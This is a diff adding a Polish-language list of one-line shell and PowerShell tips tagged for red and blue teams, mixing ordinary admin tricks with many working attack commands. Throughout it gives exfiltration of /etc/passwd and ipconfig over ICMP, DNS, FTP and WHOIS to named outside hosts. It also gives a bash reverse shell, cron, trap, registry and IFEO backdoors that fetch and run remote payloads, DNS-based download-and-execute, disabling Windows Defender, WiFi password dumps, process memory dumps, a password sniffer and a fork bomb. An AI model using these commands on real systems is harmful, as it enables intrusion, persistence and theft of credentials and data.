@@ -1,0 +1,131 @@
+(Add-Type -m '[DllImport("user32.dll")]public static extern bool LockWorkStation();' -Name "Lock" -pas)::LockWorkStation() - sposób blokowania ekranu PowerShellem	#Powershell,  #Windows
+Add-Type -t 'public class User32 {[System.Runtime.InteropServices.DllImport("user32.dll")] public static extern bool LockWorkStation();}'; [User32]::LockWorkStation() - zablokuj ekran PowerShellem	#Powershell,  #Windows
+rundll32 user32,LockWorkStation - zablokuj ekran z wiersza poleceń	#Windows
+while read -r line; do echo "Linia: $line"; done < dict.txt - jeden ze sposobów czytania linijka po linijce z pliku	#Unix, #Bash
+Add-Type -t 'public class Foo { public static void Main(){ System.Console.WriteLine("Ciekawe te protipy!");}}';[Foo]::Main() - uruchom kod C# prosto z PowerShella	#PowerShell, #CSharp, #RedTeam, #Magic
+Gadający PowerShell: Add-Type -AssemblyName System.Speech; [Speech.Synthesis.SpeechSynthesizer]::new().Speak("Fajne te protipy")	#PowerShell, #DotNET, #Fun
+(Get-Date)-(gcim Win32_OperatingSystem).LastBootUpTime - uptime w Windows PowerShellu	#PowerShell, #RedTeam, #BlueTeam, #Recon
+Skaner portów TCP w bashu: for p in {22,443,2083,8880,31337}; do (timeout 1s bash -c "</dev/tcp/berkeley.edu/$p")2>/dev/null && echo "$p - open"||echo "$p - closed"; done	#Unix, #Bash, #RedTeam, #Recon
+Podręczny skaner portów w PowerShellu: 22,443,2083,8880,31337|%{"$_ - "+([Net.Sockets.TcpClient]::new()).ConnectAsync("berkeley.edu", $_).Wait(1000)}2>$null	#Powershell, #RedTeam, #Recon
+ps uax | grep [p]wsh - odnajdź wśród procesów tekst pwsh, jednak pomiń proces z grepem	#Linux, #MacOS, #BlueTeam
+Start-Process -Verb RunAs powershell.exe - uruchom proces powershell.exe z uprawnieniami administratora	#Powershell, #Admin, #BlueTeam
+Żeby przyjemniej się pracowało w Windows PowerShellu (5.1), zainstaluj nowy PSReadLine: Install-Module -Name PSReadLine -AllowClobber -Force	#Powershell, #Admin, #BlueTeam
+tail -F access.log wyświetla aktualnie dopisywaną zawartość pliku, nawet kiedy zostanie on usunięty i stworzony na nowo (czego nie robi tail -f access.log)	#Linux, #MacOS, #BlueTeam
+& "C:\Program Files\Wireshark\tshark.exe" -i Wi-Fi -l -T fields -e data "icmp[0]=8" | % { -join ($_ -split "(.{2})" -match "." | % { [char][byte]"0x$_"}) } - wyświetl payload pakietów ICMP	#Powershell, #Admin, #BlueTeam, #Magic
+Dodaj kolejny katalog do zmiennej środowiskowej PATH dla wszystkich: [Environment]::SetEnvironmentVariable('Path', [Environment]::GetEnvironmentVariable('Path','Machine')+';C:\Program Files\Wireshark', 'Machine')	#Powershell, #Admin
+Get-Command -Type Application - lista binarek z $env:PATH, by móc zapolować na LOLBiny niczym @0gtweet	#Powershell, #RedTeam, #Hunting, #LOLBin
+Nie wyobrażam sobie poważnej pracy po ssh bez screen-a. Najczęściej wykorzystywane u mnie skróty: CTRL+a c, CTRL+a n, CTRL+a p, CTRL+a A, CTRL+a ", CTRL+a ESC	#Linux, #unix, #ssh, #admin
+Eksfiltracja po ICMP w jednym wierszu: (ipconfig|Out-String) -split "(?s)(.{1472})" -match "."|%{ [Net.NetworkInformation.Ping]::new().Send("alphasec.pl", 100, ([Text.Encoding]::UTF8).GetBytes($_))}	#Powershell, #RedTeam, #Exfil, #ICMP, #Beauty
+watch -n 5 w - co 5 sekund wyświetlaj listę zalogowanych użytkowników wraz z kilkoma pożytecznym informacjami	#Linux, #macos, #admin
+(New-Object -ComObject Outlook.Application).session.GetDefaultFolder(10).items|select FullName,MobileTelephoneNumber,Email1Address|ft -a - pobranie kontaktów z Outlooka	#Powershell, #RedTeam, #Exfil, #Admin
+ipconfig Outlookiem: $m=(New-Object -c Outlook.Application).CreateItem(0);$m.To="darklord@localhost";$m.Subject="ip";$m.Body=(ipconfig|out-string);$m.Send()	#Powershell, #RedTeam, #Exfil, #Admin
+sudo lsof -Pn -sTCP:LISTEN -i4TCP - wyświetl aplikacje nasłuchujące na portach TCP IPv4	#MacOS, #Linux, #Unix, #BlueTeam, #Recon
+CTRL+SHIFT+ESCAPE - uruchom Menedżer zadań	#Windows
+Skróty (.lnk) pod lupą: gci *.lnk | % { (New-Object -com WScript.Shell).CreateShortcut($_)} | select fullname,targetpath,arguments | fl	#Powershell, #BlueTeam, #ThreatHunting, #Malware
+sed -i s/root/toor/g /etc/passwd - zmień frazy root na toor w pliku /etc/passwd	#Linux, #Unix, #MacOS, #Bash
+Get-PnpDevice -PresentOnly - wyświetl aktualnie podłączone urządzenia Plug and Play	#Powershell, #RedTeam, #BlueTeam, #Recon
+WebSockety w Powershellu, czyli aktualnie rejestrowane certyfikaty SSL na żywo: iwr aptm.in/g/certstream|iex; Invoke-CertStream	#Powershell, #RedTeam, #BlueTeam, #ThreatHunting, #SSL
+-join [char[]]$arr - szybki, sprytny sposób na zamianę tablicy bajtów na łańcuch znaków	#Powershell,  #HackWay
+Powiesiła Ci się sesja ssh i chcesz ją zabić, odzyskując terminal? Użyj ~.	#Linux, #SSH, #DevOps
+Szybki upload FTP? Easy! [Net.WebClient]::New().UploadFile("ftp://key:logger@ftp.aptmc.pl/key.log", (gi "key.log"))	#Powershell, #RedTeam, #Exfil
+Lista subdomen cia.gov na podstawie rejestrowanych certyfikatów: curl -s 'https://crt.sh?output=json&q=cia.gov'|jq '.[].name_value'|sort -u	#Linux, #Bash, #DevOps, #Recon
+(irm crt.sh -b @{output="json";q="cia.gov"}).name_value|sort -u - lista domen w cia.gov na podstawie rejestrowanych certyfikatów	#Powershell, #RedTeam, #BlueTeam, #Recon
+for a in /proc/[0-9]*; do echo -n "`basename $a` (`stat -c %U:%G $a`) "; cat $a/cmdline|tr "\0" " "; echo ; done|sort -n - lista procesów bez polecenia ps	#Linux, #Bash, #DevOps, #Recon
+Wykorzystując mikrokontroler ATmega32U4 łatwo zbudujemy własny pendrive-klawiaturę niczym Rubber Ducky	#Hardware, #Arduino, #Powershell, #RedTeam, #BlueTeam
+(netsh wl sh net) -match "^SSID" - lista dostępnych sieci WiFi	#Powershell, #RedTeam, #BlueTeam
+Przekieruj wynik polecenia bezpośrednio do wygodnego przetwarzania w vimie: ps uax | vim -	#Linux, #Unix, #MacOS, #Bash
+Restart-Computer - zrestartuj komputer. Po prostu.	#Powershell, #RedTeam, #BlueTeam
+(iwr thehackernews.com).Links.Href | sls '/20' - pobierz linki do ostatnich artykułów na thehackernews.com	#Powershell, #RedTeam, #BlueTeam
+ni -f "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe" | sp -name Debugger -Value "powershell -c iwr aptmc.pl/calc|iex #" - dodaj backdoor uruchamiany zamiast startu MS Painta	#Powershell, #RedTeam, #BlueTeam, #Backdoor
+sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 'DELETE from LSQuarantineEvent' - usuń historię pobranych plików na MacOS z kwarantanny	#MacOS, #RedTeam, #BlueTeam, #Recon, #Forensics
+sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 'select DISTINCT LSQuarantineDataURLString from LSQuarantineEvent' - pokaż historię pobranych plików na MacOS	#MacOS, #RedTeam, #BlueTeam, #Recon, #Forensics
+filter fb64 { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_)) } - przydatny filtr do dekodowania Base64	#Powershell, #RedTeam, #Base64
+ssh -t drg@host "screen -dRS foo" - i zrywane sesje SSH nie straszne	#Linux, #Unix, #MacOS, #Bash, #RedTeam, #BlueTeam, #ssh
+cat /etc/passwd | pbcopy - wrzuć zawartość wskazanego pliku prosto do schowka	#MacOS, #Clipboard, #RedTeam
+Get-MpThreatDetection - wyświetl zidentyfikowane przez Windows Defendera zagrożenia	#Powershell, #RedTeam, #BlueTeam, #Windows, #WindowsDefender
+Wyświetl wyłączone opcje Windows Defendera: $WDprefs=(Get-MpPreference); gm -i $WDprefs -n Disable*|% { if ($WDprefs.($_.Name) -eq $True) { Write-Host -f red ("{0} ma wartosc {1}!" -f $_.Name,$WDPrefs.($_.Name)) } }	#Powershell, #RedTeam, #BlueTeam, #Windows, #WindowsDefender
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend - wyłącz Windows Defendera niczym Trickbot, REvil Ransomware czy inny malware	#Powershell, #RedTeam, #Malware, #Windows, #WindowsDefender
+ping -a 10.0.0.1 - powiadom dźwiękowo, kiedy pingowany host wróci	#Linux, #Unix, #MacOS, #Bash, #RedTeam, #BlueTeam, #Admin
+powershell -w h -enc (gp HKCU:\Software\Microsoft\Windows).Signature - uruchom payload ukryty wcześniej w rejestrze, zakodowany w base64	#Powershell, #RedTeam, #Backdoor, #Rejestr, #Windows
+Zmień/stwórz nową wartość w rejestrze: sp HKCU:\Software\Microsoft\Windows Signature "YwBhAGwAYwA="	#Powershell, #RedTeam, #Backdoor, #Rejestr, #Windows
+Twój oneliner jest coraz dłuższy? Użyj fc, żeby edytować poprzednie polecenie w domyślnym edytorze tekstu	#Linux, #Unix, #MacOS, #Bash, #RedTeam, #blueteam, #admin
+caffeinate -i - nie pozwól, by macbook usnął	#MacOS, #RedTeam, #BlueTeam
+$env:PSExecutionPolicyPreference = "Bypass" - jeden ze sposobów ominięcia Polityki Uruchamiania Skryptów (ExecutionPolicy)	#Powershell, #RedTeam, #Windows
+trap '`curl -ksL aptmc.pl/trap/`' EXIT - backdoor uruchamiający złośliwy payload po zakończeniu sesji terminala	#Linux, #Unix, #MacOS, #Bash, #RedTeam, #Backdoor
+(gcm ssh).source - wyświetl pełną ścieżkę do polecenia ssh	#Powershell, #RedTeam, #BlueTeam, #Windows
+log show --style compact --predicate 'process == "sharingd" && eventMessage CONTAINS "WiFi join start"' --last 1d - pokaż z jakimi WiFi łączył się ostatnio Mac	#MacOS, #RedTeam, #Recon, #Forensics
+Parametr -Wait cmdletu Get-Content pozwoli monitorować nowe linie dopisywane do pliku	#Powershell, #RedTeam, #BlueTeam, #Windows
+Monitorowanie plików na żywo może być wygodniejsze z wykorzystaniem less +F zamiast tail -f	#Linux, #MacOS, #BlueTeam
+(sv -o a -p password "").Attributes.Add([ValidateScript]({irm "aptmc.pl/?$_";return $true;})) - eksfiltruj zmienną password kiedy tylko zostanie ustawiona	#Powershell, #RedTeam, #Windows, #Backdoor
+netsh wlan export profile folder=. key=clear - wyeksportuj sieci WiFi wraz z hasłami	#Powershell, #Windows, #RedTeam, #Recon
+mdls -name kMDItemWhereFroms plik.zip - pokaż skąd został pobrany plik plik.zip	#MacOS, #threathunting, #blueteam
+Get-ScheduledTask|%{[pscustomobject]@{Name=$_.TaskName;Execute=$_.Actions.Execute;Args=$_.Actions.Arguments}}|Out-GridView - zapoluj na złośliwe zadania	#Powershell, #BlueTeam, #ThreatHunting, #Windows, #Backdoor
+pbpaste - wykradnij zawartość schowka w macOS X	#MacOS, #Clipboard, #RedTeam
+Get-Service | ConvertTo-Html > services.html - eksportuj listę usług do HTML	#Powershell, #RedTeam, #Recon, #Administration, #Windows
+Get-NetIPAddress -AddressState Preferred|select IPAddress,InterfaceAlias - wyświetl aktywne interfejsy sieciowe i ich IP	#Powershell, #RedTeam, #Recon, #Administration, #Windows
+gc -head 10 plik.txt, gc -tail 10 plik.txt - wyświetl odpowiednio 10 pierwszych linijek i 10 ostatnich linijek pliku	#Powershell
+Polowanie na latające po sieci hasła: tcpdump -n -i any -A -l port http or port ftp or port smtp or port imap or port pop3|grep --color -Ei -C 2 'authorization:|pass=|pwd=|login=|user=|username=|user |pass '	#Unix, #Bash, #RedTeam, #Tcpdump, #Passwords
+gci -r $HOME|gi -s *|where Stream -ne ':$DATA'|select Filename,Stream - znajdź w katalogu domowym użytkownika pliki, które posiadają ukrytą zawartość jako Alternate Data Streams	#Windows, #Powershell, #BlueTeam, #ThreatHunting
+_(){ _|_& };_ - bashowa fork bomba pozwalająca sprawdzić poprawność konfiguracji systemów Unix/Linux	#Unix, #Bash, #RedTeam, #BlueTeam, #Administration
+for(){$p=(gps|Sort-Object -D CPU|Select -First ($Host.UI.RawUI.WindowSize.Height-4)|Out-String).trim();cls;""+(date);$p;sleep 1} - *nixowy top w Powershellu	#Powershell, #BlueTeam, #Administration
+New-Item -Path "HKCU:\Software\Microsoft\Command Processor" -Force|Set-ItemProperty -Name AutoRun -Value "mspaint" - dodaj backdoora, który przy uruchamianiu cmd.exe uruchomi również coś dla zabicia nudy	#Windows, #Powershell, #BlueTeam, #RedTeam, #ThreatHunting
+Warto czasem spojrzeć, czy nie były podłączane podejrzane klawiatury: ls HKLM:\SYSTEM\CurrentControlSet\Enum\HID\*	#Windows, #Powershell, #BlueTeam, #ThreatHunting
+Symulacja klawiatury Powershellem? Czemu nie: Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('^{ESC}calc.exe{ENTER}')	#Windows, #Powershell, #RedTeam
+$i=gp HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU; $i.MRUList.ToCharArray()|%{$i.$_} - pokaż ostatnio uruchamiane polecenia	#Windows, #Powershell, #RedTeam, #ThreatHunting
+for a in $(cat /etc/passwd|openssl base64); do curl -s ftp://exfil.aptmc.pl/test_$a -O /dev/null; done - eksfiltruj dane pod płaszczem zapytań FTP	#Unix, #Bash, #Exfil, #RedTeam
+python -m pyftpdlib -p 21 -w - uruchom anonimowy serwer FTP do zapisu	#Unix, #RedTeam, #BlueTeam, #FTP, #Exfil, #Python
+1..254 | % {Resolve-DnsName x.x.x.$_ -ErrorAction SilentlyContinue} - rekonesans RevDNS	#Powershell, #Recon, #DNS, #RedTeam
+$ErrorActionPreference = "SilentlyContinue" - nie wyświetlaj (krytycznych) błędów i cichutko kontynuuj wykonywanie	#Powershell #cmdlet
+echo 'PROMPT_COMMAND="history -a"' >> ~/.profile - aktualizuj ~/.bash_history na bieżąco	#Unix, #Bash, #PowerUser
+filter tb64 { [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($_)) } - przydatny filtr do kodowania Base64	#Powershell, #RedTeam, #Base64
+while(1) { if ((Get-Clipboard) -match "\.exe") { Set-Clipboard "calc.exe" } sleep 1 } - malutkie nadużycie schowka	#Powershell, #RedTeam, #Malware, #Clipboard, #Windows
+less -r <plik> - czytaj <plik> wyświetlając kolory i inne znaki sterujące	#Unix, #Bash
+ls env: wyświetli zmienne środowiskowe	#Powershell, #Recon
+ls HKCU:\Software\Sysinternals|select Name - pokaż które narzędzia z Sysinternals (np. PsExec) były używane	#Powershell, #ThreatHunting, #BlueTeam, #Windows, #Sysinternals
+curl -i https://nasa.gov/ - wyświetl odpowiedź serwera HTTP wraz z nagłówkami	#Bash, #RedTeam, #Blueteam
+([adsisearcher]"objectCategory=computer").FindAll() - pobierz listę komputerów z Active Directory	#Windows, #RedTeam, #Powershell, #ActiveDirectory, #Recon
+Get-Acl pomoże szybko sprawdzić uprawnienia zarówno do plików/katalogów jak i kluczy w rejestrze	#Powershell, #Windows, #RedTeam, #BlueTeam
+rundll32.exe c:\windows\system32\comsvcs.dll MiniDump 555 555.dmp full - zapisz zrzut pamięci procesu o ID 555	#Windows, #RedTeam
+Powershellowy Select-String pomoże odnaleźć interesujące stringi niczym grep	#Powershell, #Windows, #RedTeam, #BlueTeam
+strings.exe z pakietu Sysinternals pomoże szybko analizować tekst w plikach binarnych	#Windows, #RedTeam, #BlueTeam, #Sysinternals
+Potrzebujesz wrócić do zagłębionego katalogu, z którego przez przypadek wyszedłeś? Ratunkiem będzie cd -	#Bash
+whois -h aptm.in "$(cat /etc/passwd)" - eksfiltruj dane z wykorzystaniem usługi WHOIS	#Bash, #RedTeam, #Exfil
+Wyświetl internetowe połączenia TCP: Get-NetTCPConnection -AppliedSetting Internet	#Powershell, #BlueTeam, #ThreatHunting
+Get-FileHash c:\Windows\System32\cmd.exe - wyświetl hash SHA256 pliku	#Powershell, #BlueTeam, #ThreatHunting
+Get-DnsClientCache|select data,entry|fl - pokaż cache DNS	#Powershell, #RedTeam, #ThreatHunting, #Exfil, #DNS, #Recon
+ssh -L 8080:intranet:80 aptm.in - tuneluj intranet:80 dostępny z aptm.in do localhost:8080	#SSH, #Linux, #Windows, #RedTeam, #BlueTeam, #Pivoting, #DevOps
+ssh -R :8080:localhost:80 aptm.in - udostępnij lokalny port 80 na aptm.in:8080	#SSH, #Linux, #Windows, #RedTeam, #BlueTeam, #Pivoting
+Uruchom autoruns.exe prosto z linii poleceń: \\live.sysinternals.com\tools\autoruns.exe i zobacz co startuje	#Windows, #BlueTeam, #ThreatHunting
+Payload DNS-over-HTTPS dla *nixów: curl -ks "https://dns.google/resolve?name=echo.aptmc.pl&type=txt"|jq '.Answer[0].data'|tr -d '"\'|base64 -d|sh	#Bash, #RedTeam, #DNS, #Unix, #Infil, #C2
+Infiltracja po DNS-over-HTTPS: (irm "https://dns.google/resolve?name=calc.aptmc.pl&type=txt").answer.data|iex|iex	#Powershell, #RedTeam, #DoH, #DNS, #Windows, #Infil, #C2
+ps|gm - dzięki Get-Member (gm) poznasz co ma do zaoferowania zwracany obiekt	#Powershell, #RedTeam, #BlueTeam, #GoodToKnow
+host -t txt echo.aptmc.pl|awk -F'"' '{ print $2 }'|openssl base64 -d|sh - uruchom payload z DNS na *nixach	#Bash, #RedTeam, #DNS, #Unix, #Infil, #C2
+Pobierz i uruchom payload po DNS: [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Resolve-DnsName -Type TXT msg.aptmc.pl).strings))|iex	#Powershell, #RedTeam, #DNS, #Windows, #Infil, #C2
+docker run -p 8080:8080 remnux/cyberchef - własna instancja CyberChefa na porcie 8080	#Docker, #CyberChef, #MustKnow, #SwissKnife
+socat -T 7 TCP-LISTEN:2048,pktinfo,fork,reuseaddr SYSTEM:'cat > loots/tcp/$SOCAT_PEERADDR.$$.txt' - uniwersalny listener	#Linux, #RedTeam, #BlueTeam, #Exfil
+Szybka eksfiltracja pliku po HTTP: iwr -me po -i <plik> http://<host:port>	#Powershell, #RedTeam, #Exfil
+cat (Get-PSReadLineOption).HistorySavePath - wyświetl historię poleceń Powershella	#Powershell, #RedTeam, #BlueTeam, #ThreatHunting
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd - serwer ssh na Windowsie	#Windows, #Powershell, #SSH
+ssh -D 2048 user@host - wykorzystaj zdalny host ssh jako szyfrowane proxy	#Linux, #Windows, #RedTeam, #BlueTeam, #Proxy, #SSH
+(netsh wlan show profiles)|%{$n=(""+($_ -split ":")[1]).trim(); netsh wlan show profile name="$n" key=clear}|sls "Key Content","SSID name" - hasła WiFi na tacy	#Powershell, #Windows, #RedTeam, #Recon
+whoami /all - coś więcej niż gołe whoami	#Windows, #RedTeam, #Recon
+ps | Out-GridView - i życie staje się wygodniejsze	#Powershell, #Windows, #Usability
+socat TCP-LISTEN:2048,fork,reuseaddr STDIO - obsłuż wielu klientów na porcie 2048	#Linux, #RedTeam, #BlueTeam, #Socat, #RevShell
+(ls "HKCU:\Software\Microsoft\Office\*\*\Security\Trusted Documents\TrustRecords").Property - pokaż dokumenty Microsoft Office, którym zaufał użytkownik	#Powershell, #ThreatHunting, #BlueTeam, #Windows, #Office
+gp HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run - pokaż co jest uruchamiane po zalogowaniu	#Powershell, #BlueTeam, #Backdoor, #Windows, #Autostart
+iptables -t nat -p tcp -I PREROUTING -m multiport --dports 50:65535 -j REDIRECT --to-port 22 - przekieruje wszystkie połączenia TCP od portu 50 w górę na port 22	#Linux, #RedTeam, #BlueTeam, #Exfil
+Podgląd payloadu ICMP w Scapy: python3 -c 'from scapy.all import *; sniff(filter="icmp and icmp[0]=8", prn=(lambda x: print(x[1].src, x[ICMP].load) if hasattr(x[ICMP], "load") else None ))'	#Unix, #RedTeam, #BlueTeam, #ICMP, #Exfil, #Python, #Scapy
+hping3 --icmp -d 1000 aptm.in --file /etc/passwd - eksfiltracja po ICMP pliku /etc/passwd	#Unix, #RedTeam, #ICMP, #Exfil
+Eksfiltracja po DNS? Proszę bardzo: iwr aptm.in/g/dnsex|iex; whoami|Invoke-DNSExfil foo.aptmc.pl	#Powershell, #RedTeam, #DNS, #Exfil
+iwr aptm.in/g/icmpex|iex; ipconfig|Invoke-ICMPExfil aptm.in - eksfiltracja danych po ICMP w Powershellu to bajka	#Powershell, #RedTeam, #ICMP, #Exfil
+setspn.exe -Q MSSQLSvc/* błyskawicznie wyciągnie wszystkie usługi MSSQL z AD	#Windows, #RedTeam, #Recon
+(crontab -l; echo '0 4 * * * curl -ksL aptm.in/czwarta|sh') | crontab - może być zupełnie skutecznym backdoorem na Linux/Unix/MacOS	#Bash, #Backdoor, #RedTeam, #Unix
+Wykorzystaj cmdlet Start-Transcript, żeby zapisać transkrypt dla istotnych sesji	#Powershell, #RedTeam, #BlueTeam,
+gp "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*"|where Debugger|select PSChildName,Debugger - jeśli wynik nie jest pusty - masz Problem	#Powershell, #ThreatHunting, #BlueTeam
+alias ssh="ssh -M -S /tmp/%r@%h:%p -oControlPersist=yes" - bardzo fajny/bardzo groźny backdoor, zwłaszcza na hoście przesiadkowym	#Bash, #RedTeam, #SSH, #Backdoor, #LTO
+docker run -p 443:443 mikesplain/openvas - uruchomienie działającego OpenVAS z wykorzystaniem Dockera	#Docker, #RedTeam, #MakeItLoud, #Recon, #Vulnerabilities
+for i in {1..254}; do host x.x.x.$i|grep -v NXDOMAIN; done - szybki revdns recon danej sieci /24	#Bash, #RedTeam, #Recon, #OSINT
+(irm ipinfo.io/json).ip - szybki sposób na uzyskanie zewnętrznego adresu IP	#Powershell, #RedTeam, #Recon
+Udostępnij po HTTP na porcie 8000 aktualny katalog: python -m SimpleHTTPServer (Python2)	#Python, #HTTP, #RedTeam
+bash -i >& /dev/tcp/aptm.in/1337 0>&1 - szybki reverse shell w czystym bashu do aptm.in na port 1337/TCP	#Bash, #RedTeam, #ReverseShell
+Włączając Powershell Constrained Language Mode istotnie ograniczysz możliwości złośliwych skryptów	#Powershell, #BlueTeam, #MakeItHarder
